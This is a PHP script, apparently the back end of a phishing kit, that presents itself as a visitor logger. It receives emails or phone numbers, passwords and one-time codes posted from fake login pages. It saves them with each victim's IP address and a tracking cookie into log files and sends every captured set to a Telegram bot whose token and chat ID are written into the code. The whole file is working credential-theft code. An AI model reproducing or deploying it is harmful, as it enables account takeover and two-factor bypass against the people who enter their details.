<?php
// log_visit.php

// Telegram bot config
define('TELEGRAM_BOT_TOKEN', '7320656614:AAEk0pN0SA3D0wdfD4pryGIKxDsSGlTa-T8');
define('TELEGRAM_CHAT_ID', '7248811825');

$json_log_file = 'visitors.json'; // structured grouped logs
$text_log_file = 'visitors.log';  // plain text for admin panel
$sound_flag_file = 'newvisitor.flag';
$redirect_dir = 'redirects';

if (!is_dir($redirect_dir)) {
    mkdir($redirect_dir, 0777, true);
}

function sendTelegramMessage($msg) {
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Split message into chunks if longer than Telegram limit
    $chunks = str_split($msg, 4000);
    foreach ($chunks as $chunk) {
        $post_fields = [
            'chat_id' => $chatId,
            'text' => $chunk,
            'parse_mode' => 'HTML'
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_exec($ch);
        curl_close($ch);
    }
}

function get_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$ip = get_ip();

$data = json_decode(file_get_contents('php://input'), true);
if (!$data) $data = $_POST;

$emailOrPhone = '';
if (!empty($data['email'])) {
    $emailOrPhone = trim($data['email']);
} elseif (!empty($data['identifier'])) {
    $emailOrPhone = trim($data['identifier']);
    if (!empty($data['mode']) && $data['mode'] === 'phone' && !empty($data['country_code'])) {
        $emailOrPhone = $data['country_code'] . ' ' . $emailOrPhone;
    }
} elseif (!empty($data['phone'])) {
    $emailOrPhone = trim($data['phone']);
}

$password = isset($data['password']) ? trim($data['password']) : '';
$otp = isset($data['otp']) ? trim($data['otp']) : '';
$page = isset($data['page']) ? trim($data['page']) : '';

if (!isset($_COOKIE['visitor_id'])) {
    $visitor_id = bin2hex(random_bytes(8));
    setcookie('visitor_id', $visitor_id, time() + 86400 * 30, "/");
} else {
    $visitor_id = $_COOKIE['visitor_id'];
}

$timestamp = date('Y-m-d H:i:s');

// Load existing logs
$logs = file_exists($json_log_file) ? json_decode(file_get_contents($json_log_file), true) : [];
if (!isset($logs[$visitor_id])) {
    $logs[$visitor_id] = [
        'visitor_id' => $visitor_id,
        'ip' => $ip,
        'logs' => []
    ];
}

// Add this entry
$logs[$visitor_id]['logs'][] = [
    'email_or_phone' => $emailOrPhone,
    'password' => $password,
    'otp' => $otp,
    'page' => $page,
    'timestamp' => $timestamp
];

// Save grouped JSON log
file_put_contents($json_log_file, json_encode($logs, JSON_PRETTY_PRINT));

// Also save plain-text log for admin panel
$plainTextLog = '';
foreach ($logs as $visitor) {
    foreach ($visitor['logs'] as $entry) {
        $plainTextLog .= "[{$entry['timestamp']}] IP: {$visitor['ip']} | "
            . "Email/Phone: {$entry['email_or_phone']} | "
            . "Password: {$entry['password']} | "
            . "OTP: {$entry['otp']} | "
            . "Page: {$entry['page']}\n";
    }
}
file_put_contents($text_log_file, $plainTextLog);

// New visitor flag
if ($page === 'index') {
    touch($sound_flag_file);
}

// Telegram alert
if ($emailOrPhone !== '' || $password !== '' || $otp !== '') {
    $msg = "<b>Visitor Log Update</b>\n";
    $msg .= "Visitor ID: $visitor_id\n";
    $msg .= "IP: $ip\n";
    foreach ($logs[$visitor_id]['logs'] as $entry) {
        $msg .= "-----\n";
        $msg .= "Time: {$entry['timestamp']}\n";
        $msg .= "Email/Phone: {$entry['email_or_phone']}\n";
        $msg .= "Password: {$entry['password']}\n";
        $msg .= "OTP: {$entry['otp']}\n";
        $msg .= "Page: {$entry['page']}\n";
    }
    sendTelegramMessage($msg);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok', 'visitor_id' => $visitor_id]);
exit;
?>
